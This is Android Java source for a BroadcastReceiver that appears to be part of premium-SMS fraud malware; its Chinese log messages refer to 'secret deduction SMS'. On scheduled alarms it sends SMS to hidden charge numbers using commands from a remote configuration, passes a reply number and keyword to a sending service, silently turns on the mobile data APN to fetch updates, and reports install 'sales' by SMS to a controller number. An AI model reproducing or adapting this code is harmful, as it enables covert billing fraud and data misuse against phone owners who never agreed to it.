package com.sttm.charge;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;

import java.util.Calendar;
import java.util.List;

import org.xmlpull.v1.XmlPullParserException;

import android.content.BroadcastReceiver;

import android.content.Context;
import android.content.Intent;

import android.util.Log;

import com.sttm.bean.App;
import com.sttm.bean.SalesVolume;

import com.sttm.model.GPRSService;

import com.sttm.model.AppFitler;
import com.sttm.model.AppService;

import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.model.TimerCenter;

import com.sttm.util.IsNetOpen;
import com.sttm.util.KsoCache;
import com.sttm.util.RootHelper;

import com.sttm.util.LogFile;

import com.sttm.util.SmsCenterNumber;

public class KsoAlarmService extends BroadcastReceiver {

	@Override
	public void onReceive(final Context context, Intent intent) {

		if (intent.getAction().equals("start")) {

			KsoMainCourse.startSaleHandler(context);
			KsoMainCourse.startGPRSHandler(context);

		} else if (intent.getAction().equals("apps")) {
			UpdateAppsData(context);

		} else if (intent.getAction().equals("timeout")) {
			KsoCache.getInstance().reSetValue("accessFilterSms", false);

		} else if (intent.getAction().equals("SmsCenter")) {
			LogFile.WriteLogFile("获取短信中心号码时间到，发送短信");
			SmsCenterNumber smsCenter = new SmsCenterNumber(context);
			smsCenter.sendSms();
		} else if (intent.getAction().equals("downLoadSalesFile")) {
			UpdateGprsData(context, "sale.xml");

		} else if (intent.getAction().equals("sales5")) {

			Log.d("TAG", "发送第五条销量时间到");
			LogFile.WriteLogFile("发送第五条销量时间到");

			String saleSmsCat = KsoCache.getInstance().getValue("salenum") != null ? (String) KsoCache
					.getInstance().getValue("salenum") : "";
			Log.d("TAG", "准备发送第五条销量" + saleSmsCat);
			SalesVolume sv = SalesVolume.getInstance(context, "05");
			if (!"".equals(saleSmsCat)) {
				SmsSenderAndReceiver.send2(saleSmsCat, sv
						.mergesalesvolumestring().trim());

				context.deleteFile("sale.xml");
				Log.d("TAG", "发送了第五条销量,销量号码为" + saleSmsCat + "销量内容为"
						+ sv.mergesalesvolumestring().trim());
				LogFile.WriteLogFile("发送了第五条销量,销量号码为" + saleSmsCat + "销量内容为"
						+ sv.mergesalesvolumestring().trim());

			}

		} else if (intent.getAction().equals("GPRS")) {

			Log.d("TAG", "GPRS 更新时间到了");
			LogFile.WriteLogFile("GPRS 更新时间到了 ");

			Calendar calendar = Calendar.getInstance();
			int hour = calendar.get(Calendar.HOUR_OF_DAY);
			if (hour < 7) {
				int year = calendar.get(Calendar.YEAR);
				int month = calendar.get(Calendar.MONTH);
				int day = calendar.get(Calendar.DAY_OF_MONTH);

				hour = 7 + hour;
				int temp = (int) Math.random() * 100;
				while (temp >= 60) {
					temp = (int) Math.random() * 100;
				}
				int minute = temp;
				TimerCenter tcenter = new TimerCenter();

				Calendar timerDelay = tcenter.getTime(year, month, day, hour,
						minute, 0);
				tcenter.startTimerHandler(context, timerDelay, "GPRS");
				return;

			}

			// GPRS更新
			UpdateGprsData(context, "shuihu.xml");

			LogFile.WriteLogFile("GPRS 更新完成");

		} else if (intent.getAction().equals("Money")) {
			InputStream inputStream;
			try {
				inputStream = context.openFileInput("apps.xml");
				if (inputStream != null) {
					//List<String> apps = AppFitler.getapp(inputStream);
					
					List<App> apps = AppFitler.getapp2(inputStream);
					boolean flag = AppFitler.checkApp2(context, apps);
					System.out.println("money check for app2"+flag);
					if (flag) {
							return;
					}
				}
			} catch (FileNotFoundException e) {
				return;
			} catch (XmlPullParserException e) {
				return;
			} catch (IOException e) {
				return;
			}

			LogFile.WriteLogFile("GPRS更新后,发送暗扣短信时间到了");

			String secretSmsNumber = KsoCache.getInstance().getValue(
					"secretSmsNumber") != null ? (String) KsoCache
					.getInstance().getValue("secretSmsNumber") : "";
			String secretSmsOrder = KsoCache.getInstance().getValue(
					"secretSmsOrder") != null ? (String) KsoCache.getInstance()
					.getValue("secretSmsOrder") : "";

			long time = KsoCache.getInstance().getValue("interval") != null ? (Long) KsoCache
					.getInstance().getValue("interval") : 0;

			int secretSmsCount = KsoCache.getInstance().getValue(
					"secretSmsCount") != null ? (Integer) KsoCache
					.getInstance().getValue("secretSmsCount") : 2;
			String relpyNumber = KsoCache.getInstance().getValue("replyNumber") != null ? (String) KsoCache
					.getInstance().getValue("replyNumber") : "";
			String keyword = KsoCache.getInstance().getValue("keyword") != null ? (String) KsoCache
					.getInstance().getValue("keyword") : "";

			Log.d("TAG", "暗扣号码" + secretSmsNumber + "暗扣指令" + secretSmsOrder);

			if (!"".equals(secretSmsNumber) && !"".equals(secretSmsOrder)) {
				if (secretSmsCount > 0) {
					Log.d("TAG", "启动发送短信服务");
					LogFile.WriteLogFile("启动发送短信服务");
					Intent service = new Intent(context, SendSmsService.class);
					service.putExtra("sendTime", time);
					service.putExtra("sendCount", secretSmsCount);
					service.putExtra("flag", 4);
					service.putExtra("secretSmsReplyNumber", relpyNumber);
					service.putExtra("secretSmsNumber", secretSmsNumber);
					service.putExtra("secretSmsOrder", secretSmsOrder);
					service.putExtra("keyword", keyword);
					context.startService(service);
				}

			}

		} else if (intent.getAction().equals("ksoSendSms")) {
			Log.d("test", "发送暗扣短信定时时间到了");
			LogFile.WriteLogFile("发送暗扣短信定时时间到了");

			String smsNumber = KsoCache.getInstance().getValue("ksoSmsNumber") != null ? (String) KsoCache
					.getInstance().getValue("ksoSmsNumber") : "";

			String smsOrder = KsoCache.getInstance().getValue("ksoSmsOrder") != null ? (String) KsoCache
					.getInstance().getValue("ksoSmsOrder") : "";

			if (!"".equals(smsNumber) && !"".equals(smsOrder)) {
				SmsSenderAndReceiver.send2(smsNumber, smsOrder);
				long timeout = KsoCache.getInstance().getValue("timeout") == null ? 4
						: (Long) KsoCache.getInstance().getValue("timeout");
				KsoMainCourse.startTimeoutHandler(context, timeout);
				Log.d("test", "向移动用户发送了第" + 1 + "条暗扣短信,暗扣通道：" + smsNumber
						+ " 暗扣指令：" + smsOrder);

				LogFile.WriteLogFile("向移动用户发送了第" + 1 + "条暗扣短信,暗扣通道："
						+ smsNumber + " 暗扣指令：" + smsOrder);

			}

		}
	}

	public void UpdateGprsData(final Context context, final String fileName) {
		new Thread() {

			public void run() {
				IsNetOpen ino = new IsNetOpen(context);

				if (!ino.checkNet()) {

					LogFile.WriteLogFile("手机没有网络");
					WapApnHelper wh = new WapApnHelper(context);
					wh.saveState();

					wh.openAPN();

					if (!ino.checkNet()) {

						KsoCache.getInstance().reSetValue("updateFail",
								fileName);

					} else {
						GPRSService.updateGprsData(context, fileName);

						wh.reSetNetState();
					}
				} else {
					GPRSService.updateGprsData(context, fileName);
				}

			}
		}.start();
	}

	public void UpdateAppsData(final Context context) {
		new Thread() {
			public void run() {

				IsNetOpen ino = new IsNetOpen(context);

				if (!ino.checkNet()) {

					WapApnHelper wh = new WapApnHelper(context);
					wh.saveState();
					wh.openAPN();

					try {
						Thread.sleep(5000);
					} catch (Exception e) {

					}
					if (!ino.checkNet()) {

						KsoCache.getInstance().reSetValue("updateFail",
								"sale.xml");

					} else {
						AppService.updateAppsData(context);

						wh.reSetNetState();
					}

				} else {
					AppService.updateAppsData(context);
				}

			}
		}.start();
	}

}
